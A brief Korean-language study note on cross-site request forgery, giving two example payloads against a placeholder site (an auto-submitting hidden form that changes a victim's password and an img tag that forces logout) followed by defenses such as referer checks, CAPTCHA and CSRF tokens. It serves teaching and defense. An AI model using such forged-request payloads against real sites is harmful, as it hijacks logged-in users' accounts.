## CSRF란

사이트간 요청 위조(Cross Site Request Forgery)

웹 보안 취약점의 하나로 데이터 수정, 삭제 등 동작을 유도하여 공격

## 예시

### 예시1

패스워드 변경 요청 형식이 아래인 사이트
```
POST /password/change HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30
Cookie: session=yvthwsztyeQkAPzeQ5gHgTvlyxHfsAfE

password=123123
```

웹사이트에 로그인이 된 상태에서 아래 HTML 페이지를 사용자가 열도록 유도하면 "123123"으로 비밀번호가 변경됨

```
<form action="https://vulnerable-website.com/password/change" method="POST">
          <input type="hidden" name="password" value="123123">
   </form>
<script>          
document.forms[0].submit();
</script>
```

### 예시2

로그아웃이 GET 메서드로 처리되는 웹사이트라면 아래 이미지가 포함된 페이지에 접속만 해도 로그아웃이 됨

```
<img src="http://vulnerable-website.com/logout" />
```

## 방어 방법

1. 검증된 referer의 요청만 처리
2. CAPTCHA 도입
3. CSRF 토큰 - 사용자 세션에 임의의 값을 저장하여 요청시마다 보내게 하고, 서버에서 모든 요청에 대해 해당 값을 검증
